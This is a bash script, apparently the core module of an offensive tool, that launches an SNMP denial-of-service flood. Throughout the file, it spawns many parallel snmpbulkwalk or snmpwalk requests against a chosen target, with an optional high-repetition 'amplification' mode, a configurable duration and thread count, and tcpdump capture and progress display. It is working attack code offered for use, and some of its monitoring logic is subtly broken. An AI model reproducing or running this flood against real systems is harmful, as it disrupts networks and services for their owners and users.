#!/bin/bash
# core/attack_engine.sh
# Authors: ransc0rp1on & 6umi1029

source ../lib/terminal.sh
source ../lib/network.sh

# Global variables
ATTACK_PID=""
TCPDUMP_PID=""
ATTACK_RUNNING=false

# Function to launch SNMP flood attack
launch_snmp_flood() {
    local target=$1
    local community=$2
    local threads=$3
    local version=$4
    local duration=$5
    local amplification=$6
    local interface=$7
    
    draw_header "SNMP DoS ATTACK"
    info_msg "Target: $target | Community: $community"
    info_msg "Threads: $threads | Duration: $duration seconds"
    info_msg "SNMP Version: $version | Amplification: $amplification"
    info_msg "Interface: $interface"
    
    # Start traffic capture
    local capture_file="outputs/capture_$(date +%s).pcap"
    start_traffic_capture "$interface" "$capture_file"
    
    # Calculate end time
    local end_time=$((SECONDS + duration))
    
    # Start attack
    ATTACK_RUNNING=true
    (
        while [ $SECONDS -lt $end_time ] && [ "$ATTACK_RUNNING" = true ]; do
            for ((i=0; i<threads; i++)); do
                if [ "$amplification" = "true" ]; then
                    # Use a high amplification OID
                    snmpbulkwalk -v "$version" -c "$community" -Cn0 -Cr100 "$target" .1.3.6 >/dev/null 2>&1 &
                else
                    snmpwalk -v "$version" -c "$community" "$target" .1.3.6.1.2.1.1 >/dev/null 2>&1 &
                fi
            done
            sleep 0.1
        done
    ) >/dev/null 2>&1 &
    
    ATTACK_PID=$!
    info_msg "Attack started with PID $ATTACK_PID"
    
    # Monitor attack
    monitor_attack "$duration"
}

# Function to start traffic capture
start_traffic_capture() {
    local interface=$1
    local output_file=$2
    
    # Check if interface exists
    if ! ip link show "$interface" &>/dev/null; then
        error_msg "Interface $interface not found!"
        return 1
    fi
    
    # Start tcpdump in background
    tcpdump -i "$interface" -w "$output_file" "udp port 161" >/dev/null 2>&1 &
    TCPDUMP_PID=$!
    info_msg "Traffic capture started (PID: $TCPDUMP_PID)"
    info_msg "Capturing to: $output_file"
}

# Function to stop attack
stop_attack() {
    if [ "$ATTACK_RUNNING" = false ]; then
        warning_msg "No attack running"
        return
    fi
    
    if [ -n "$ATTACK_PID" ]; then
        kill -9 "$ATTACK_PID" 2>/dev/null
        wait "$ATTACK_PID" 2>/dev/null
        ATTACK_PID=""
        ATTACK_RUNNING=false
        success_msg "Attack stopped"
    fi
    
    if [ -n "$TCPDUMP_PID" ]; then
        kill -2 "$TCPDUMP_PID" 2>/dev/null
        wait "$TCPDUMP_PID" 2>/dev/null
        TCPDUMP_PID=""
        success_msg "Traffic capture stopped"
    fi
}

# Function to monitor attack progress
monitor_attack() {
    local duration=$1
    local start_time=$SECONDS
    local progress=0
    
    while [ $progress -lt 100 ] && [ "$ATTACK_RUNNING" = true ]; do
        elapsed=$((SECONDS - start_time))
        progress=$((elapsed * 100 / duration))
        
        if [ $progress -gt 100 ]; then
            progress=100
        fi
        
        # Get packet count
        packet_count=0
        if [ -n "$TCPDUMP_PID" ]; then
            packet_count=$(ps -p $TCPDUMP_PID -o etime= | awk -F: '{if (NF==2) print $1*60+$2; else print $1*3600+$2*60+$3}')
        fi
        
        # Display progress
        clear
        draw_header "ATTACK IN PROGRESS"
        echo -e "  Target: ${CYAN}$TARGET${NC}"
        echo -e "  Duration: ${YELLOW}$elapsed/$duration seconds${NC}"
        echo -e "  Packets Sent: ${GREEN}$((threads * elapsed * 10))${NC}"
        echo -e "  Capture PID: ${BLUE}$TCPDUMP_PID${NC}"
        echo
        
        # Draw progress bar
        draw_bar_chart $progress 100 "Progress"
        
        sleep 1
    done
    
    # Clean up after completion
    if [ "$ATTACK_RUNNING" = true ]; then
        stop_attack
        success_msg "Attack completed successfully!"
    fi
}

# Function to run DoS attack
run_dos_attack() {
    local target=$1
    local community=$2
    
    # Default parameters
    local threads=50
    local version="2c"
    local duration=60
    local amplification="false"
    local interface=$INTERFACE
    
    # User input
    echo -n "Number of threads [default: 50]: "
    read -r custom_threads
    [ -n "$custom_threads" ] && threads="$custom_threads"
    
    echo -n "SNMP version (1|2c) [default: 2c]: "
    read -r custom_version
    [ -n "$custom_version" ] && version="$custom_version"
    
    echo -n "Duration (seconds) [default: 60]: "
    read -r custom_duration
    [ -n "$custom_duration" ] && duration="$custom_duration"
    
    echo -n "Enable amplification? (y/n) [default: n]: "
    read -r amp_choice
    if [ "$amp_choice" = "y" ]; then
        amplification="true"
    fi
    
    echo -n "Network interface [default: $interface]: "
    read -r custom_interface
    [ -n "$custom_interface" ] && interface="$custom_interface"
    
    # Confirm action
    if ! confirm_action "Launch DoS attack against $target?"; then
        info_msg "Attack canceled"
        return
    fi
    
    # Launch attack
    launch_snmp_flood "$target" "$community" "$threads" "$version" "$duration" "$amplification" "$interface"
}